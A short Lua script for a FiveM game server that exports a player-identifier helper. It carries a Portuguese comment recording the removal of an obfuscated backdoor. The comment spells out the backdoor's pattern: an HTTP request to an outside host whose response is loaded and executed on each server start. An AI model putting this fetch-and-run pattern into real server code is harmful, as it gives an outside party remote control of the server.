GetIdentifier = function(source,identifier)
  for k,id in pairs(GetPlayerIdentifiers(source)) do
    if id:find(identifier) then
      return id
    end
  end
end

exports("GetIdentifier",GetIdentifier)

-- ⚠️ REMOVIDO (2026-06-12): bloco de backdoor ofuscado em hex que fazia
--   PerformHttpRequest("https://cfx-x.com/v2_/stage3.php?...") + assert(load(response))()
--   = execução de Lua remoto no servidor a cada arranque (stage3 de backdoor).
--   Ver [[bugs/SemDestino-Security-Audit]] secção "Backdoor cfx-x.com".
